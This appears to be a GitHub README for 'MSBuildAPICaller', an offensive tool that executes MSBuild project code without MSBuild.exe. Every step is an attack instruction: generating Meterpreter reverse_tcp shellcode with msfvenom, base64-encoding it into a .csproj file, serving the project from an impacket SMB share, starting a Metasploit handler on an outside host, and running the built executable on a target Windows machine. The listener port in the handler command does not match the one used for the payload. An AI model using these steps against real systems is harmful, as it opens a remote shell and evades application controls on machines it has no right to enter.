# MSBuildAPICaller
 MSBuild Without MSBuild.exe


# How to build and execute

## Step 0: git clone this repo on your Kali Linux

```
git clone https://github.com/xax007/MSBuildAPICaller
cd MSBuildAPICaller
```

## Step 1: Build IEShim.cs on your Windows Machine
```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:"Microsoft.Build.Framework.dll";"Microsoft.Build.Tasks.v4.0.dll";"Microsoft.Build.Utilities.v4.0.dll" /target:library IEShim.cs
```

## Step 2: Modify "projectPath" variable on line 60 of msbuildapicaller.cs to your needs

Example: `string projectPath = '\\\\192.168.1.100\\share\\msbuildapicaller.csproj';`

## Step 3: Generate shellcode and replace in msbuildapicaller.csproj

```
msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o payload64.bin LHOST=10.0.0.1 LPORT=2000
``` 
and convert shellcode from binary to base64 string  

```
base64 -w 0 -i /root/payload64.bin > payload64.txt
```  

Replace <Base64 Encoded x64 Shellcode>  with your base64 encoded x64 shellcode in msbuildapicaller.csproj


## Step 4: Replace `AssemblyFile` variable in msbuildapicaller.csproj file with the location of your compiled dll from step 1

## Step 5: Build msbuildapicaller.cs

```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:"Microsoft.Build.Framework.dll";"Microsoft.Build.dll";"Microsoft.Build.Engine.dll";"Microsoft.Build.Utilities.v4.0.dll";"System.Runtime.dll" /target:exe msbuildapicaller.cs
```

## Step 6: start a SMB Server via impacket

```
impacket-smbserver pentestlab /msbuild -smb2support
```
## Step 7: start a Metasploit exploit handler
```
$ msfdb run
msf5> handler -p payload windows/x64/meterpreter/reverse_tcp -P 4444 -H 1.2.3.4
```
## Step 8: Execute msbuildapicaller.exe on target windows machine


reference: [MSBUILD WITHOUT MSBUILD](https://pentestlaboratories.com/2020/01/27/msbuild-without-msbuild/)
